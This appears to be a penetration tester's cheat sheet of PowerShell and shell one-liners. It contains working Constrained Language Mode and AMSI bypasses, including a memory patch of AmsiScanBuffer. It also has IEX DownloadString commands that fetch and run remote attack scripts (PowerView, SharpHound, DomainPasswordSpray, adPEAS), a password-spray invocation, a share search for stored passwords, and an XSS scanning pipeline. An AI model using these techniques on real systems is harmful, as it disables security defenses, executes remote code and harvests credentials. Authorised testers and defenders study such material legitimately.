### Bypasses
------------
##### Powershell CLM Bypass:
~~~
$CurrTemp = $env:temp
$CurrTmp = $env:tmp
$TEMPBypassPath = "C:\windows\temp"
$TMPBypassPath = "C:\windows\temp"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"
Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe  -ExecutionPolicy bypass"
sleep 5
#Set it back
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
~~~

##### AMSI Bypass:
~~~
$a = [Ref].Assembly.GetTypes()
ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}}
$d = $c.GetFields('NonPublic,Static')
ForEach($e in $d) {if ($e.Name -like "*Context") {$f = $e}}
$g = $f.GetValue($null)
[IntPtr]$ptr = $g
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
~~~

##### AMSI Bypass 2
~~~
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
~~~

##### Powershell Modified AMSI .Net Bypass script - In Memory
~~~
IEX (New-Object Net.Webclient).DownloadString('https://gist.githubusercontent.com/shantanu561993/6483e524dc225a188de04465c8512909/raw/db219421ea911b820e9a484754f03a26fbfb9c27/AMSI_bypass_Reflection.ps1')
~~~

### Scripts - In Memory
-----------------------
#### Host Recon
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1');
Invoke-HostRecon
~~~

#### ConvertTo-PowerShell
~~~
IEX (New-Object Net.Webclient).DownloadString('https://github.com/cfalta/PowerShellArmoury/raw/2d9bea5e1c10353186fe75ebc28c5e596247dca3/utilities/ConvertTo-Powershell.ps1');
~~~

##### Powerview
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
~~~

##### Spray
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/HeeresS/DomainPasswordSpray/master/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -Domain <domain> -Password password
~~~
##### Sharphound
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -Domain <domain> -CollectionMethod All
~~~
##### Safe SSL/TLS-Channel
~~~
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [
Net.SecurityProtocolType]::Ssl2 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.Se
curityProtocolType]::Tls12
~~~
##### BloodHound collector (adPEAS)
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/6110
6960/adPEAS/main/adPEAS.ps1'); Invoke-adPEAS -Module Bloodhound -Scope All
~~~
##### Check PATH of host and permissions on each folder in PATH (PowerShell function)
~~~
function Invoke-PathCheck {
    param (
        [string]$AccesschkPath = ".\accesschk64.exe"
    )

    # Controleer of accesschk64.exe bestaat
    if (-Not (Test-Path $AccesschkPath)) {
        Write-Host "accesschk64.exe not found at $AccesschkPath"
        return
    }

    # Split de $Env:Path en controleer permissies voor elke map
    $Env:Path -split ";" | ForEach-Object {
        $path = $_.Trim()
        if (-Not [string]::IsNullOrWhiteSpace($path)) {
            Write-Host "[+] Checking permissions for: $path"
            & $AccesschkPath -wud -accepteula $path
            Write-Host "---------------------------"
        }
    }
}

# Roep de functie aan
Invoke-PathCheck -AccesschkPath "C:\Path\to\accesschk64.exe"
~~~
##### Just check PATH
~~~
$Env:Path -split ";" | ForEach-Object { $_ }
~~~
##### Invoke-PasswordSearch
~~~
function Invoke-PasswordSearch {
    param (
        [Parameter(Mandatory=$true)]
        [string]$SharesFilePath
    )

    # Lees alle paden uit het tekstbestand
    $paths = Get-Content -Path $SharesFilePath

    $results = @()

    foreach ($path in $paths) {
        # Controleer of het pad niet leeg is
        if (![string]::IsNullOrWhiteSpace($path)) {
            Write-Host "Processing path: $path"
            try {
                $matches = Get-ChildItem -Path $path -Recurse -File | Select-String "password="
                $results += $matches | ForEach-Object {
                    [PSCustomObject]@{
                        Path       = $_.Path
                        Line       = $_.Line
                        LineNumber = $_.LineNumber
                    }
                }
            } catch {
                Write-Host "Failed to process path: $path"
            }
        }
    }

    # Retourneer de resultaten
    return $results
}

# Voorbeeld van het aanroepen van de functie en het opslaan van de resultaten in een variabele
# $searchResults = Invoke-PasswordSearch -SharesFilePath "C:\path\to\shares.txt"
~~~~
XSS line
~~~~
echo target.com | subfinder -silent | katana -silent | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m Vulnerable"; done
~~~~
Visualize.py
~~~~
import json
import argparse
from pyvis.network import Network

# Set up argument parser
parser = argparse.ArgumentParser(description='Visualize network data from a JSON file.')
parser.add_argument('-f', '--file', required=True, help='Path to the JSON file to visualize.')
args = parser.parse_args()

# Load JSON data from the specified file
with open(args.file, 'r') as f:
    data = [json.loads(line) for line in f]

# Initialize a PyVis Network with local resources
net = Network(height='750px', width='100%', notebook=True, cdn_resources='local')

# Add nodes and edges to the network
for item in data:
    # Create a node for the URL
    url_node = item['url']
    net.add_node(url_node, title=url_node)

    # Create nodes for IP addresses
    for ip in item['a']:
        net.add_node(ip, title=ip)
        net.add_edge(url_node, ip)

    # Create nodes for status codes and titles
    status_node = f"Status: {item['status_code']}"
    net.add_node(status_node, title=status_node)
    net.add_edge(url_node, status_node)

    if 'title' in item:
        title_node = item['title']
        net.add_node(title_node, title=title_node)
        net.add_edge(url_node, title_node)

# Set the physics of the network
net.force_atlas_2based()

# Save and show the network
net.show('network_visualization.html')




